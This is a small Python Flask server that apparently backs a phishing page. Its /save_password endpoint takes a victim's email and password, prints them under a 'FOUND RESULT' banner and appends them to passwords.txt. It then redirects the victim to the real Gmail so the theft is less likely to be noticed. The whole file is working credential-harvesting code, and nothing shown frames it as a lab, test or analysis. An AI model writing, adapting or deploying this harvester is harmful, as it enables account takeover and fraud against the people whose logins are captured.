from flask import Flask, request, jsonify, render_template, send_from_directory, send_file

app = Flask(__name__, static_url_path='')

@app.route('/static/<path:path>')
def send_static(path):
    return send_from_directory('static', path)

@app.route('/')
def index():
    return render_template("index.html")


@app.route('/save_password', methods=['POST'])
def save_password():
    password = request.get_json()["password"]
    email = request.get_json()["email"]

    print(f"FOUND RESULT\n\tEmail: {email},\n\tPassword: {password}\nEND RESULT")
    with open("passwords.txt", "a") as f:
        f.write(f"FOUND RESULT\n\tEmail: {email},\n\tPassword: {password}\nEND RESULT")

    return jsonify({
        "status": "success",
        "redirect_to": "https://mail.google.com/"
    })



if __name__ == '__main__':
    # Threaded option to enable multiple instances for multiple user access support
    app.run(threaded=True, port=1025, host="0.0.0.0")
